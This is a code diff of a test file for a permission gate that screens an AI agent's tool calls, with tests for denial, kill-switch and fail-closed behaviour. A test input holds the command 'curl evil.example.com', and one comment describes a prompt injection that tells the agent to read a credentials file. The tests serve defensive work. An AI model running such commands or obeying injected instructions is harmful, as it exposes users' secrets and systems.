@@ -1,5 +1,5 @@
 import { afterAll, beforeEach, describe, expect, it } from 'vitest';
-import { closePool } from '../db/pool.js';
+import { closePool, withBusiness } from '../db/pool.js';
 import { resetDatabase } from '../test/db.js';
 import { buildCharter } from '../test/fixtures.js';
 import { installCharter } from '../charter/store.js';
@@ -131,7 +131,7 @@ describe('SDK tool-name translation', () => {
 
 describe('the gate hook', () => {
   it('denies a tool with no internal name instead of passing it through', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
 
     const { decision, reason } = await decisionFor(bundle, 'know.reader', 'Bash', {
       command: 'curl evil.example.com',
@@ -142,7 +142,7 @@ describe('the gate hook', () => {
   });
 
   it('allows a read the agent actually holds', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
 
     const { decision } = await decisionFor(bundle, 'know.reader', 'Read', {
       file_path: join(DOCS, 'invoice.pdf'),
@@ -152,7 +152,7 @@ describe('the gate hook', () => {
   });
 
   it('denies a write outright - it is not a tool the SDK map offers at all', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
 
     // `Write` used to map to `file.write`, which is in READ_ONLY_TOOLS and so
     // short-circuits the gate at step 4 with no audit row. It is now unmapped
@@ -166,7 +166,7 @@ describe('the gate hook', () => {
   });
 
   it('turns a queued approval into a denial that names the approval', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
 
     // The run must end rather than block: an approval can take hours, and the
     // orchestrator resumes from the id carried in the reason.
@@ -182,7 +182,7 @@ describe('the gate hook', () => {
   });
 
   it('denies a read that climbs out of the document root', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
 
     // The injection this agent exists to contain: untrusted content telling the
     // reader to go and read the credentials file. `doc.fetch` is read-only, so
@@ -200,10 +200,10 @@ describe('the gate hook', () => {
     // test can inspect `updatedInput`. An entity id no longer vouches for an
     // address the charter cannot resolve (`visibility-scoring.test.ts`), and a
     // queued approval returns no payload to assert on.
-    const bundle = await installCharter(
-      buildCharter({ knownCounterpartyEmailDomain: 'b.com' }),
-      { businessId: BUSINESS },
-    );
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter( // TENANCY-TODO(task 7)
+      bdb,
+      buildCharter({ knownCounterpartyEmailDomain: 'b.com' })
+    ));
 
     const hook = createGateHook({
       agent: 'comms.email',
@@ -236,7 +236,7 @@ describe('the gate hook', () => {
   });
 
   it('fails closed when the gate throws instead of letting it escape', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
 
     // readAmountMinor throws a TypeError on a decimal amount. What the SDK does
     // with a rejected hook is unspecified, and unspecified on the permission
@@ -253,12 +253,9 @@ describe('the gate hook', () => {
   });
 
   it('the kill switch reaches the SDK, not just direct callers', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
     const { trip, release } = await import('../governance/killswitch.js');
-    await trip('all', 'p_boss', 'עצירה', {
-      businessId: BUSINESS,
-      charterVersion: bundle.charterVersion,
-    });
+    await withBusiness(BUSINESS, (bdb) => trip(bdb, 'all', 'p_boss', 'עצירה', { charterVersion: bundle.charterVersion })); // TENANCY-TODO(task 7)
 
     const { decision, reason } = await decisionFor(bundle, 'know.reader', 'Read', {
       file_path: join(DOCS, 'x.txt'),
@@ -267,16 +264,13 @@ describe('the gate hook', () => {
     expect(decision).toBe('deny');
     expect(reason).toContain('kill_switch_active');
 
-    await release('all', 'p_boss', 'סוף מבחן', {
-      businessId: BUSINESS,
-      charterVersion: bundle.charterVersion,
-    });
+    await withBusiness(BUSINESS, (bdb) => release(bdb, 'all', 'p_boss', 'סוף מבחן', { charterVersion: bundle.charterVersion })); // TENANCY-TODO(task 7)
   });
 });
 
 describe('decision reporting', () => {
   it('reports every decision to the caller, not only to the audit log', async () => {
-    const bundle = await installCharter(buildCharter(), { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, buildCharter())); // TENANCY-TODO(task 7)
     const seen: { tool: string; decision: string; code: string }[] = [];
 
     const hook = createGateHook({
@@ -313,7 +307,7 @@ describe('decision reporting', () => {
 describe('what runKnowReader hands the SDK', () => {
   it('takes its system prompt from the signed charter rather than a literal', async () => {
     const charter = buildCharter();
-    const bundle = await installCharter(charter, { businessId: BUSINESS });
+    const bundle = await withBusiness(BUSINESS, (bdb) => installCharter(bdb, charter)); // TENANCY-TODO(task 7)
     const prompt = buildReadingSystemPrompt(bundle);
 
     // Named first: `startsWith('')` is true of every string, so an absent
